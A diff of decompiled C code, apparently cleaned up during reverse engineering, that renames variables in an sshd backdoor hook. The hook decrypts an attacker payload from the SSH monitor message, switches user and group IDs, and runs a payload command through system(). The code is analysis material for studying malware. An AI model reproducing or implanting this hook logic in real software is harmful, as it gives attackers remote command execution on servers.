@@ -26,21 +26,21 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   libc_imports_t *libc_imports_ref;
   sshd_ctx_t *sshd_ctx;
   sshd_monitor_func_t *orig_mm_answer_keyallowed;
-  ulong sock_read_buf_len;
+  size_t sock_read_buf_len;
   sshd_ctx_t *sshd_ctx_cursor;
-  void *keyverify_handler;
+  sshd_monitor_func_t keyverify_handler;
   u64 uid_gid_pair;
   pfn_exit_t exit_fn;
   global_context_t *ctx;
   BOOL state_ok;
   gid_t rgid;
-  int iVar12;
-  long loop_tmp;
-  ulong copy_idx;
-  ulong payload_len;
+  int orig_call_result;
+  size_t header_copy_idx;
+  size_t copy_idx;
+  size_t payload_len;
   ssize_t write_result;
-  long payload_copy_idx;
-  ulong payload_data_offset;
+  size_t payload_copy_idx;
+  size_t payload_data_offset;
   sshd_payload_ctx_t **clear_cursor;
   u8 *payload_header_cursor;
   u8 *payload_data_cursor;
@@ -49,7 +49,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   u8 zero_seed;
   sshbuf payload_buf;
   global_context_t *global_ctx;
-  libc_imports_t *libc_imports;
+  size_t payload_chunk_size;
   u8 payload_seed_buf[57];
   sshd_payload_ctx_t *payload_ctx;
   sshd_monitor_func_t orig_handler;
@@ -82,13 +82,13 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
     *(undefined4 *)clear_cursor = 0;
     clear_cursor = (sshd_payload_ctx_t **)((long)clear_cursor + (ulong)zero_seed * -8 + 4);
   }
-  libc_imports = (libc_imports_t *)0x0;
+  payload_chunk_size = 0;
   state_ok = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
   if ((state_ok == FALSE) ||
      (state_ok = extract_payload_message
-                         ((sshbuf *)&payload_ctx,(size_t)orig_handler,(size_t *)&libc_imports,ctx),
+                         ((sshbuf *)&payload_ctx,(size_t)orig_handler,&payload_chunk_size,ctx),
      state_ok == FALSE)) goto LAB_0010944f;
-  decrypt_payload_message((key_payload_t *)payload_ctx,(size_t)libc_imports,ctx);
+  decrypt_payload_message((key_payload_t *)payload_ctx,payload_chunk_size,ctx);
   payload_state = ctx->payload_state;
   if (payload_state == 3) {
 LAB_00109216:
@@ -128,9 +128,9 @@ LAB_00109216:
            (*(char *)((long)payload_words + (payload_len - 0x73)) == '\0')) {
           uid_gid_pair = *(undefined8 *)(payload_words + 0x57);
           rgid = (gid_t)((ulong)uid_gid_pair >> 0x20);
-          if (((rgid == 0) || (iVar12 = (*libc_imports_ref->setresgid)(rgid,rgid,rgid), iVar12 != -1)) &&
+          if (((rgid == 0) || (orig_call_result = (*libc_imports_ref->setresgid)(rgid,rgid,rgid), orig_call_result != -1)) &&
              ((ruid = (uid_t)uid_gid_pair, ruid == 0 ||
-              (iVar12 = (*libc_imports_ref->setresuid)(ruid,ruid,ruid), iVar12 != -1)))) {
+              (orig_call_result = (*libc_imports_ref->setresuid)(ruid,ruid,ruid), orig_call_result != -1)))) {
             (*libc_imports_ref->system)((char *)(payload_words + 0x5b));
             ctx->payload_state = 4;
             goto LAB_0010944f;
@@ -273,10 +273,10 @@ LAB_00109471:
         payload_data_cursor = ctx->payload_data;
         payload_copy_idx = 0;
         do {
-          loop_tmp = payload_copy_idx + 1;
+          header_copy_idx = payload_copy_idx + 1;
           payload_header_buf[payload_copy_idx] = payload_data_cursor[payload_copy_idx + payload_data_offset];
-          payload_copy_idx = loop_tmp;
-        } while (loop_tmp != 0x72);
+          payload_copy_idx = header_copy_idx;
+        } while (header_copy_idx != 0x72);
         if ((payload_len < payload_data_offset) || (copy_idx = 0, payload_len - payload_data_offset < sock_read_buf_len)) goto LAB_00109471;
         for (; sock_read_buf_len != copy_idx; copy_idx = copy_idx + 1) {
           payload_data_cursor[copy_idx + payload_data_offset] = ctx->sock_read_buf[copy_idx];
@@ -303,7 +303,7 @@ LAB_00109429:
 LAB_0010944f:
                     /* WARNING: Could not recover jumptable at 0x0010946f. Too many branches */
                     /* WARNING: Treating indirect jump as call */
-  iVar12 = (*(code *)orig_mm_answer_keyallowed)(ssh,sock,m);
-  return iVar12;
+  orig_call_result = (*(code *)orig_mm_answer_keyallowed)(ssh,sock,m);
+  return orig_call_result;
 }
 
